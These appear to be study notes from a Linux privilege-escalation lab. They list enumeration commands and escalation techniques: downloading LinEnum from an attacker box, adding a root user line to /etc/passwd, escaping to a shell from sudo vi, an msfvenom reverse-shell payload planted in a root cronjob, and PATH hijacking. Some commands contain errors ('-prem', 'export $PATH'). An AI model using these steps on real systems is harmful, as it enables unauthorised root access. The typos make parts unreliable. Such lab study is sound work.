# Enumeration

- use the LinEnum.sh script it gives good info.
- Some of the other important enumeration items
```
hostname
uname -a
cat /proc/version -> provides information about target system processes
cat /etc/issue
ps
ps -A -> all running processes
ps axjf -> view process tree
ps aux -> user processes that are not attached to the terminal
env
sudo -l
ls
id
/etc/passwd
history
ifconfig
ip route
netstat -> gather information on existing network connections
netstat -a -> shows all the listening ports and established connections
netstat -at or netstat -au -> list TCP & UDP protocols respectively
netstat -l -> ports in listening mode. these ports are open & ready to accept incoming connections
netstat -s -> usage statistics by protocol
netstat -su -> usage stats for udp
netstat -st -> usage stats for tcp
netstat -tp -> connections with pid & service information
netstat -i -> shows interface statistics
netstat -ano -> a (display all sockets); n (do not resolve names); o (display timers)
find . -name flag1.txt
find /home -name flag1.txt
find / -type d -name config
find / -type f -perm 0777
find / -perm a=x -> find all executable files
find /home -user frank
find / -mtime 10 -> files modified in last 10 days
find / -atime 10 -> files accessed in last 10 days
find / -cmin 60 -> files changed in the last 60 mins
find / -amin 60 -> files accessed in the last 60 mins
find / -size 50M -> files with a size of 50 MB
find / -size +100M -> files greater than size of 100Mb
find / -type d -writable 2>/dev/null -> writable directories
find / -type d -perm -222 2>/dev/null -> "         "
find / -perm -o w -type d 2>/dev/null -> "         "
find / -prem -o x -type f -> executable files
find / -name python*
find / -name gcc*
find / -name perl*
find / -perm -u=s -type f 2>/dev/null -> SUID bit files

```
- start a webserver with python where the file is present, `python -m http.server 80`
- go to the target box and use wget there, `wget <attacker-box>:80/LinEnum.sh`
- `cat /etc/shells` to list the number of available & valid shells on the box

## Write access to /etc/passwd
- before we add our user, first create a compliant password hash. use the command `openssl passwd -1 -salt [salt] [password]`. ex:- `openssl passwd -1 -salt new 123`
- Add a line as the following - `new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash`

## Abusing SUID/SGID files
- try and see if you can execute these files

## Escaping VI Editor
- always use `sudo -l` to know what commands the user can execute as a sudo user.
- therefore you will be able to run as root user without a root password 
- this can help you escalate your own privileges
- running this command as `user8` will show us that this user can run vi as root user.
- Type in `sudo vi` and type `:!sh` or `:!bash` to give you a root shell.


## Misconfigured Binaries or GTFOBins
- GTFOBins are curated list of binaries that can be exploited by an attacker to by pass local security restrictions
- For more info look at [GTFOBins](https://gtfobins.github.io)
- this is how we have managed to get a shell with a VI editor
- this can also help us get a reverse/bind shell as well
- If you are looking for windows binaries [LOLBAS](https://lolbas-project.github.io/)
- LOLBAS - Living of Land binaries and scripts

## Exploit cronjobs
- If you find any cronjob running as root, then you can get a root shell.
- First create the payload
- `msfvenom -p cmd/unix/reverse_tcp LHOST=<attacker-host> LPORT=<attacker-port>`
- copy that payload and edit the script & replace it with payload contents and therefore you become an admin

## Exploit PATH variable
- If you find a SGID file which is running as root and is picking some executables as part of the script, you can create a dummy executable in a specific path and export that path & re-run the executable.
- If we do that we will be getting as shell as the SUID user.
- Example:- `cd /tmp;echo "/bin/bash" > ls;export $PATH=/tmp:$PATH`
- Now, when SGID user executes ls, he will ideally be giving us a SHELL.
